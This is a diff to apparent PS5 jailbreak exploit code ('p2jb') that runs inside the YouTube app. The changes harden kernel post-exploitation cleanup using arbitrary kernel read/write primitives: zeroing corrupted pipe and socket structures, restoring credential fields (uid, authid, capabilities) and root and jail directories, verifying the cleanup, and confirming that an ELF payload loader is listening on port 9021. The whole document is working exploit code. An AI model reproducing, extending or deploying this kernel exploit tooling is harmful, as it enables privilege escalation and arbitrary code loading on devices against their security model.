@@ -1572,16 +1572,20 @@
                 if (rc > 0n && rc < 0x10000n) S.kwrite32(fp + 0x28n, Number(rc) + delta);
             };
             const null_inpcb_pktopts = fd => {
-                const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
+                if (!S.fd_ofiles || S.fd_ofiles === 0n) return;
+                const fdent_size = BigInt(S.OFF.FILEDESCENT_SIZE || 0x30);
+                const fp = S.kread64(S.fd_ofiles + BigInt(fd) * fdent_size);
                 if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
                 const f_data = S.kread64(fp);
                 if (f_data === 0n || (f_data >> 48n) !== 0xFFFFn) return;
-                const so_pcb = S.kread64(f_data + 0x18n);
+                const so_pcb_off = S.OFF.SO_PCB !== undefined ? BigInt(S.OFF.SO_PCB) : 0x18n;
+                const so_pcb = S.kread64(f_data + so_pcb_off);
                 if (so_pcb === 0n || (so_pcb >> 48n) !== 0xFFFFn) return;
                 // Zero the inpcb pktopts pointer so ip6_freepktopts() is never called
                 // on close. The pktopns may have been reclaimed by a kqueue; freeing it
                 // as M_IP6OPT causes a zone-mismatch panic.
-                S.kwrite64(so_pcb + S.OFF.INPCB_PKTOPTS, 0n);
+                const pktopts_off = S.OFF.INPCB_PKTOPTS !== undefined ? BigInt(S.OFF.INPCB_PKTOPTS) : 0x120n;
+                S.kwrite64(so_pcb + pktopts_off, 0n);
             };
 
             for (const fd of [S.master_rfd, S.master_wfd, S.victim_rfd, S.victim_wfd]) {
@@ -2054,6 +2058,7 @@
                         " victim=" + victim_pipe[0] + "," + victim_pipe[1] + ")");
                     await load_aioshellcode(allproc, master_pipe, victim_pipe);
                     chainload_started = true;
+                    S.elfldr_started = true;
                     await ulog("stage_elfldr: load_aioshellcode returned - " +
                         "elfldr should now be listening on :9021");
                     send_notification("Stage 7\nelfldr running - send your ELF to\n" +
@@ -2109,6 +2114,7 @@
                         const out = read32(payloadout);
                         await ulog("stage_elfldr: Thrd join done, payloadout = " + toHex(out));
                     }
+                    S.elfldr_started = true;
                     await ulog("stage_elfldr: daemon should be listening on :9021");
                     send_notification("Stage 7\nelfldr running - send your ELF to\n" +
                         "<ps5-ip>:9021  (e.g. BD-UN-JB unpatcher)");
@@ -2138,15 +2144,24 @@
 
         async function cleanup_kexp_pipes(S) {
             try {
-                if (!S.kexp_pipes || !S.kexp_pipes.master_rpipe_data) return;
-                S.kwrite64(S.kexp_pipes.master_rpipe_data + 0x00n, 0n);
-                S.kwrite64(S.kexp_pipes.master_rpipe_data + 0x08n, 0n);
-                S.kwrite64(S.kexp_pipes.master_rpipe_data + 0x10n, 0n);
-                S.kwrite64(S.kexp_pipes.master_rpipe_data + 0x18n, 0n);
-                S.kwrite64(S.kexp_pipes.victim_rpipe_data + 0x00n, 0n);
-                S.kwrite64(S.kexp_pipes.victim_rpipe_data + 0x08n, 0n);
-                S.kwrite64(S.kexp_pipes.victim_rpipe_data + 0x10n, 0n);
-                S.kwrite64(S.kexp_pipes.victim_rpipe_data + 0x18n, 0n);
+                if (!S.kexp_pipes) return;
+                const m = S.kexp_pipes.master_rpipe_data;
+                const v = S.kexp_pipes.victim_rpipe_data;
+                // Always zero master first: its buffer ptr points at victim.
+                // A dangling buffer ptr in master causes KP in pipe_free() even
+                // if victim is also gone. Zero each independently.
+                if (m && m !== 0n && (m >> 48n) === 0xFFFFn) {
+                    S.kwrite64(m + 0x00n, 0n);
+                    S.kwrite64(m + 0x08n, 0n);
+                    S.kwrite64(m + 0x10n, 0n);
+                    S.kwrite64(m + 0x18n, 0n);
+                }
+                if (v && v !== 0n && (v >> 48n) === 0xFFFFn) {
+                    S.kwrite64(v + 0x00n, 0n);
+                    S.kwrite64(v + 0x08n, 0n);
+                    S.kwrite64(v + 0x10n, 0n);
+                    S.kwrite64(v + 0x18n, 0n);
+                }
                 await ulog("cleanup: kexp pipe buffers zeroed");
             } catch (e) {
                 try { await ulog("cleanup_kexp_pipes: failed: " + e.message); } catch (_) { }
@@ -2155,21 +2170,37 @@
 
         async function cleanup_exploit_pipes(S) {
             try {
-                if (!S.master_pipe_data || !S.victim_pipe_data) {
+                const m = S.master_pipe_data;
+                const v = S.victim_pipe_data;
+                if (!m || m === 0n || (m >> 48n) !== 0xFFFFn ||
+                    !v || v === 0n || (v >> 48n) !== 0xFFFFn) {
                     await ulog("cleanup_exploit_pipes: pipe data not available, skipping");
-                    return;
+                    return false;
                 }
-                S.kwrite64(S.master_pipe_data + 0x00n, 0n);
-                S.kwrite64(S.master_pipe_data + 0x08n, 0n);
-                S.kwrite64(S.master_pipe_data + 0x10n, 0n);
-                S.kwrite64(S.master_pipe_data + 0x18n, 0n);
-                S.kwrite64(S.victim_pipe_data + 0x00n, 0n);
-                S.kwrite64(S.victim_pipe_data + 0x08n, 0n);
-                S.kwrite64(S.victim_pipe_data + 0x10n, 0n);
-                S.kwrite64(S.victim_pipe_data + 0x18n, 0n);
-                await ulog("cleanup: exploit pipe buffers zeroed");
+                for (let i = 0; i < 32; i += 8) write64(S.scratch_big + BigInt(i), 0n);
+
+                // Victim first: master is the active pipe-backed kernel R/W
+                // primitive. Once master is zeroed, this JS process cannot use
+                // that primitive for further cleanup.
+                S.kwrite(v, S.scratch_big, 32);
+                let victim_clean = true;
+                if (S.kread64(v + 0x00n) !== 0n ||
+                    S.kread64(v + 0x08n) !== 0n ||
+                    S.kread64(v + 0x10n) !== 0n ||
+                    S.kread64(v + 0x18n) !== 0n) {
+                    victim_clean = false;
+                    await ulog("cleanup_exploit_pipes: victim pipe still dirty before final retire");
+                }
+
+                // Final operation: zero master in one write. This retires the
+                // YouTube-owned JS kernel R/W primitive by design.
+                S.kwrite(m, S.scratch_big, 32);
+                S.kernel_rw_retired = true;
+                await ulog("cleanup: exploit pipe buffers zeroed; JS kernel rw retired");
+                return victim_clean;
             } catch (e) {
                 try { await ulog("cleanup_exploit_pipes: failed: " + e.message); } catch (_) { }
+                return false;
             }
         }
 
@@ -2177,13 +2208,15 @@
             try {
                 if (typeof ipv6_kernel_rw !== "undefined" && ipv6_kernel_rw.data) {
                     const d = ipv6_kernel_rw.data;
-                    const so_pcb_off = S.OFF.SO_PCB || 0x18n;
-                    const pktopts_off = S.OFF.INPCB_PKTOPTS || 0x120n;
+                    const so_pcb_off = S.OFF.SO_PCB !== undefined ? BigInt(S.OFF.SO_PCB) : 0x18n;
+                    const pktopts_off = S.OFF.INPCB_PKTOPTS !== undefined ? BigInt(S.OFF.INPCB_PKTOPTS) : 0x120n;
 
                     const zero_sock_pktinfo = (fd, label) => {
                         if (fd === undefined || fd < 0) return;
+                        if (!S.fd_ofiles || S.fd_ofiles === 0n) return;
                         try {
-                            const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
+                            const fdent_size = BigInt(S.OFF.FILEDESCENT_SIZE || 0x30);
+                            const fp = S.kread64(S.fd_ofiles + BigInt(fd) * fdent_size);
                             if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
                             const so = S.kread64(fp);
                             if (so === 0n || (so >> 48n) !== 0xFFFFn) return;
@@ -2215,31 +2248,156 @@
             }
         }
 
+        async function close_cleaned_aux_fds(S) {
+            try {
+                if (S.kexp_pipes) {
+                    for (const fd of []
+                        .concat(S.kexp_pipes.master_pipe || [])
+                        .concat(S.kexp_pipes.victim_pipe || [])) {
+                        try { syscall(SYSCALL.close, BigInt(fd)); } catch (_) { }
+                    }
+                    await ulog("cleanup: kexp pipe fds closed");
+                }
+                if (typeof ipv6_kernel_rw !== "undefined" && ipv6_kernel_rw.data) {
+                    const d = ipv6_kernel_rw.data;
+                    for (const fd of [d.master_sock, d.victim_sock, d.pipe_read_fd, d.pipe_write_fd]) {
+                        if (fd !== undefined && fd >= 0) {
+                            try { syscall(SYSCALL.close, BigInt(fd)); } catch (_) { }
+                        }
+                    }
+                    await ulog("cleanup: ipv6_kernel_rw fds closed");
+                }
+            } catch (e) {
+                try { await ulog("cleanup: close aux fds failed: " + e.message); } catch (_) { }
+            }
+        }
+
+        async function verify_cleanup_state(S, include_exploit_pipes = true) {
+            let ok = true;
+            const dirty = async (label, value) => {
+                ok = false;
+                await ulog("cleanup verify: DIRTY " + label +
+                    (value === undefined ? "" : " = " + toHex(value)));
+            };
+            const expect64 = async (label, addr, expected) => {
+                try {
+                    const actual = S.kread64(addr);
+                    if (actual !== expected) await dirty(label, actual);
+                } catch (e) {
+                    ok = false;
+                    await ulog("cleanup verify: failed reading " + label + ": " + e.message);
+                }
+            };
+            const expect32 = async (label, addr, expected) => {
+                try {
+                    const actual = S.kread32(addr);
+                    if (actual !== BigInt(expected)) await dirty(label, actual);
+                } catch (e) {
+                    ok = false;
+                    await ulog("cleanup verify: failed reading " + label + ": " + e.message);
+                }
+            };
+            const expect_pipe_zero = async (label, addr) => {
+                if (!addr || addr === 0n || (addr >> 48n) !== 0xFFFFn) return;
+                await expect64(label + ".buf0", addr + 0x00n, 0n);
+                await expect64(label + ".buf8", addr + 0x08n, 0n);
+                await expect64(label + ".buf10", addr + 0x10n, 0n);
+                await expect64(label + ".buf18", addr + 0x18n, 0n);
+            };
+            const verify_sock_pktinfo_zero = async (fd, label) => {
+                if (fd === undefined || fd < 0) return;
+                if (!S.fd_ofiles || S.fd_ofiles === 0n) return;
+                try {
+                    const fdent_size = BigInt(S.OFF.FILEDESCENT_SIZE || 0x30);
+                    const fp = S.kread64(S.fd_ofiles + BigInt(fd) * fdent_size);
+                    if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
+                    const so = S.kread64(fp);
+                    if (so === 0n || (so >> 48n) !== 0xFFFFn) return;
+                    const so_pcb_off = S.OFF.SO_PCB !== undefined ? BigInt(S.OFF.SO_PCB) : 0x18n;
+                    const pcb = S.kread64(so + so_pcb_off);
+                    if (pcb === 0n || (pcb >> 48n) !== 0xFFFFn) return;
+                    const pktopts_off = S.OFF.INPCB_PKTOPTS !== undefined ? BigInt(S.OFF.INPCB_PKTOPTS) : 0x120n;
+                    const pktopts = S.kread64(pcb + pktopts_off);
+                    if (pktopts === 0n || (pktopts >> 48n) !== 0xFFFFn) return;
+                    const pktinfo = S.kread64(pktopts + 0x10n);
+                    if (pktinfo !== 0n) await dirty(label + ".pktinfo", pktinfo);
+                } catch (e) {
+                    ok = false;
+                    await ulog("cleanup verify: failed reading " + label + ": " + e.message);
+                }
+            };
+
+            if (S.orig_ucred && S.proc_ucred !== 0n) {
+                await expect64("fd_rdir", S.proc_fd + S.OFF.FD_RDIR, S.orig_fd_rdir);
+                await expect64("fd_jdir", S.proc_fd + S.OFF.FD_JDIR, S.orig_fd_jdir);
+                await expect32("ucred.uid", S.proc_ucred + S.OFF.UCRED_CR_UID, S.orig_ucred.uid);
+                await expect32("ucred.ruid", S.proc_ucred + S.OFF.UCRED_CR_RUID, S.orig_ucred.ruid);
+                await expect32("ucred.svuid", S.proc_ucred + S.OFF.UCRED_CR_SVUID, S.orig_ucred.svuid);
+                await expect32("ucred.rgid", S.proc_ucred + S.OFF.UCRED_CR_RGID, S.orig_ucred.rgid);
+                await expect32("ucred.ngroups", S.proc_ucred + S.OFF.UCRED_CR_NGROUPS, S.orig_ucred.ngroups);
+                await expect64("ucred.attrs", S.proc_ucred + 0x80n, S.orig_ucred.attrs);
+                await expect64("ucred.authid", S.proc_ucred + S.OFF.UCRED_CR_SCEAUTHID, S.orig_ucred.authid);
+                await expect64("ucred.caps0", S.proc_ucred + S.OFF.UCRED_CR_SCECAPS0, S.orig_ucred.caps0);
+                await expect64("ucred.caps1", S.proc_ucred + S.OFF.UCRED_CR_SCECAPS1, S.orig_ucred.caps1);
+            }
+
+            if (include_exploit_pipes) {
+                await expect_pipe_zero("exploit.master_pipe", S.master_pipe_data);
+                await expect_pipe_zero("exploit.victim_pipe", S.victim_pipe_data);
+            }
+
+            if (typeof ipv6_kernel_rw !== "undefined" && ipv6_kernel_rw.data) {
+                const d = ipv6_kernel_rw.data;
+                await verify_sock_pktinfo_zero(d.master_sock, "ipv6.master_sock");
+                await verify_sock_pktinfo_zero(d.victim_sock, "ipv6.victim_sock");
+                await expect_pipe_zero("ipv6.pipe", d.pipe_addr);
+            }
+
+            if (S.kexp_pipes) {
+                await expect_pipe_zero("kexp.master_pipe", S.kexp_pipes.master_rpipe_data);
+                await expect_pipe_zero("kexp.victim_pipe", S.kexp_pipes.victim_rpipe_data);
+            }
+
+            await ulog(ok ? "cleanup verify: OK - known dirty pointers retired"
+                : "cleanup verify: FAILED - do not close YouTube yet");
+            return ok;
+        }
+
         // Cleanup kernel state before exit to prevent panic on YouTube close
         async function cleanup_kernel_state(S) {
-            if (!S.orig_ucred || S.proc_ucred === 0n) {
+            if (!S.orig_ucred || S.proc_ucred === 0n || S.proc_fd === 0n ||
+                (S.proc_ucred >> 48n) !== 0xFFFFn || (S.proc_fd >> 48n) !== 0xFFFFn) {
                 await ulog("cleanup: no saved state, skipping");
                 return;
             }
             await ulog("cleanup: restoring kernel state for safe exit");
             try {
                 // Restore fd rdir/jdir (most critical for exit path)
-                if (S.orig_fd_rdir !== 0n && (S.orig_fd_rdir >> 48n) === 0xFFFFn) {
-                    S.kwrite64(S.proc_fd + S.OFF.FD_RDIR, S.orig_fd_rdir);
+                if (S.orig_fd_rdir !== 0n && (S.orig_fd_rdir >> 48n) === 0xFFFFn &&
+                    S.OFF.FD_RDIR !== undefined) {
+                    S.kwrite64(S.proc_fd + BigInt(S.OFF.FD_RDIR), S.orig_fd_rdir);
                 }
-                if (S.orig_fd_jdir !== 0n && (S.orig_fd_jdir >> 48n) === 0xFFFFn) {
-                    S.kwrite64(S.proc_fd + S.OFF.FD_JDIR, S.orig_fd_jdir);
+                if (S.orig_fd_jdir !== 0n && (S.orig_fd_jdir >> 48n) === 0xFFFFn &&
+                    S.OFF.FD_JDIR !== undefined) {
+                    S.kwrite64(S.proc_fd + BigInt(S.OFF.FD_JDIR), S.orig_fd_jdir);
                 }
                 // Restore ucred fields (including authid/caps for consistent credentials on exit)
-                S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_UID, S.orig_ucred.uid);
-                S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_RUID, S.orig_ucred.ruid);
-                S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_SVUID, S.orig_ucred.svuid);
-                S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_RGID, S.orig_ucred.rgid);
-                S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_NGROUPS, S.orig_ucred.ngroups);
-                S.kwrite64(S.proc_ucred + 0x80n, S.orig_ucred.attrs);
-                S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCEAUTHID, S.orig_ucred.authid);
-                S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS0, S.orig_ucred.caps0);
-                S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS1, S.orig_ucred.caps1);
+                const u = S.proc_ucred;
+                const safe_w32 = (off, val) => {
+                    if (off !== undefined) S.kwrite32(u + BigInt(off), val);
+                };
+                const safe_w64 = (off, val) => {
+                    if (off !== undefined) S.kwrite64(u + BigInt(off), val);
+                };
+                safe_w32(S.OFF.UCRED_CR_UID, S.orig_ucred.uid);
+                safe_w32(S.OFF.UCRED_CR_RUID, S.orig_ucred.ruid);
+                safe_w32(S.OFF.UCRED_CR_SVUID, S.orig_ucred.svuid);
+                safe_w32(S.OFF.UCRED_CR_RGID, S.orig_ucred.rgid);
+                safe_w32(S.OFF.UCRED_CR_NGROUPS, S.orig_ucred.ngroups);
+                S.kwrite64(u + 0x80n, S.orig_ucred.attrs);
+                safe_w64(S.OFF.UCRED_CR_SCEAUTHID, S.orig_ucred.authid);
+                safe_w64(S.OFF.UCRED_CR_SCECAPS0, S.orig_ucred.caps0);
+                safe_w64(S.OFF.UCRED_CR_SCECAPS1, S.orig_ucred.caps1);
                 await ulog("cleanup: kernel state restored");
             } catch (e) {
                 await ulog("cleanup: failed: " + e.message);
@@ -2335,7 +2493,19 @@
         // corrupted pipe buffers so YouTube can close safely.
         try {
             await cleanup_kernel_state(S);
-            await cleanup_exploit_pipes(S);
+            await cleanup_ipv6_kernel_rw(S);
+            await cleanup_kexp_pipes(S);
+            if (!await verify_cleanup_state(S, false)) {
+                send_notification("p2jb cleanup verify FAILED\nDo not close YouTube yet");
+            }
+            await close_cleaned_aux_fds(S);
+            if (!S.elfldr_started) {
+                await ulog("cleanup: WARNING elfldr was not confirmed; retiring JS kernel rw will leave no confirmed loader rw");
+                send_notification("p2jb WARNING\nelfldr not confirmed");
+            }
+            if (!await cleanup_exploit_pipes(S)) {
+                send_notification("p2jb exploit pipe cleanup FAILED\nDo not close YouTube yet");
+            }
             for (const fd of [S.master_rfd, S.master_wfd, S.victim_rfd, S.victim_wfd]) {
                 try { syscall(SYSCALL.close, BigInt(fd)); } catch (_) { }
             }
